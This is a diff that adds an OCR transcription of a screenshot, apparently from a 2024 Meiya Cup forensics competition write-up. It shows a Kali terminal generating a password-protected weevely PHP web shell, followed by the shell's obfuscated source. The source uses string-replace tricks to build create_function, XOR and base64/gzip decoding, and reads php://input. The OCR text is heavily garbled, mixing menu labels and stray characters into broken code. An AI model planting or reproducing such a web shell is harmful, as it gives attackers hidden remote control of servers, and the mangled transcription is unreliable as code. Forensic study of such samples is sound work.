@@ -1,0 +1,40 @@
+# OCR: 29d6699e7420c0e3d0f9916cf9caaccf.webp
+# 来源: ./02-WriteUp/2024/2024-美亚杯-团队赛/29d6699e7420c0e3d0f9916cf9caaccf.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:20
+
+国
+Edit View Help
+File
+Actions
+rootkali)-/home/kali
+材料3
+root@kali:/home/kali
+generate123456/home/kali/Desktop/weevely.php
+weevely
+Generated /home/kali/Desktop/weevely-php'with password123456'of 761 byte
+-|Desktop/weevelylweevelyphp[ReadOnly]-Mousepad
+File +
+Edit 门
+1≤?php
+Search 留
+View
+C
+x
+Document 5
+Help
+向
+Qcn
+2$y='olctQlionx($t,$k)QlsQlc=strlenQl($k);s$l=stQlrlenQ[(st); $oloQL="：for(si=oQL:si<QL$lQL)ifoQlr(
+3$n='Q[1agzQuncompressQ[(ax(QlabaQ[se64_deQ[cQ[ode($m[1]),$k))); $oQlQl=Qlaobget_coQlntents()aob_Q
+oo
+电
+$S='[eQlnd_clean()sQlr=abaseQ[64_encQlode(lax(agQlzcompQlrQless（sQlo) 4
+$k))iprioLnt("soLpskhsrskf");
+5$X=strreplace('wc',,wCwCcrwCeatwCe_wCwCfunction)
+6$k-'（"/$khQ[(.Q[+)skfQL/",afQ[ileQ[get_conQ[tentsQ[("php://input"Q[) $m)=QlQl1)(aob_staQlrt;aeQlva
+7sr=ol$j=Qlo;($j<sco6si<su);$j++ol.$oli+Ql+)tso.=$ttsio^$ki$j/ol;) retQlQlurnsolo:if（aprQleg_mQLatch）
+8$v=$k="e10aQ[dQlc39"$khQ[="4Q[9ba59abbe56"Q$kf="eQ[0Ql57Q[f20fQ883e"； $p=3Q[6YE2vRJZi2SQ[s5G3"fQun
+9sv=str_replace('Q[,,sv.sy.sr.$k.$n.ss);
+10$g=$x(,$v);$g() 1172
